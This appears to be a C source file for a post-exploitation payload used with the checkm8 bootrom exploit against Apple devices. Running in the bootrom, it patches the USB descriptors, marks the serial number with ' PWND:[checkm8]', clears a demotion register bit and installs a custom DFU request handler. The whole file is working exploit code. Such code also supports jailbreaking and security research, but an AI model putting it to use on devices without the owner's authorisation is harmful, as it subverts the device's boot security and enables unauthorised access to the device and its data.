#include "bootrom_func.h"
#include "dev_globals.h"

GLOBAL_STR(pwnd_str, " PWND:[checkm8]");
GLOBAL_INT_ARR(fixed_desc,
               0x190209, 0x80050101,
               0x409fa, 0x1fe0000,
               0x21070000, 0xa01,
               0x8, 0x0);

GLOBAL_PTR(addr_hs_desc, ADDR_HS_DESC)
GLOBAL_PTR(addr_fs_desc, ADDR_FS_DESC)
GLOBAL_PTR(addr_usb_serial, ADDR_USB_SERIAL)
GLOBAL_PTR(addr_dfu_intf_handle, ADDR_DFU_INTF_HANDLE)
GLOBAL_CHAR(cont, 1)

PAYLOAD_SECTION
void fix_usb_descriptors()
{
    uint32_t *hs_ptr = *((uint32_t **) GET_GLOBAL(addr_hs_desc));
    uint32_t *fs_ptr = *((uint32_t **) GET_GLOBAL(addr_fs_desc));
    uint32_t *patch =  (uint32_t *) GET_PTR_TO_GLOBAL(fixed_desc);

    dev_memcpy(hs_ptr, patch, 32);
    dev_memcpy(fs_ptr, patch, 32);
}

PAYLOAD_SECTION
void patch_serial()
{
    int len, base;
    char *serial = GET_GLOBAL(addr_usb_serial);
    char *patch = GET_PTR_TO_GLOBAL(pwnd_str);

    base = dev_strlen(serial);
    len = dev_strlen(patch);

    dev_memcpy(serial + base, patch, len);
    *((uint8_t *) ADDR_CORE_DESC_SERIAL) =
            usb_create_descriptor(serial);
}

PAYLOAD_SECTION
void copy_handler(uint32_t offset, uint32_t len)
{
    uint8_t *base;
    uint8_t *target = dev_malloc(len);

    __asm__ volatile ("adr %0, _start" : "=r" (base));
    dev_memcpy(target, base + offset, len);

    *((void **) GET_GLOBAL(addr_dfu_intf_handle)) = target;
}

PAYLOAD_SECTION
void run(uint64_t handler_data)
{
    fix_usb_descriptors();
    patch_serial();

    uint32_t handler_offset = handler_data & 0xFFFFFFFF;
    uint32_t handler_len = (handler_data >> 32u) & 0xFFFFFFFF;

    uint32_t *demote = (uint32_t *) ADDR_DEMOTE_REG;
    *demote = (*demote & 0xFFFFFFFE);

    while(GET_GLOBAL(cont));

    copy_handler(handler_offset, handler_len);
}

void _start(uint64_t handler_data)
{
    run(handler_data);
}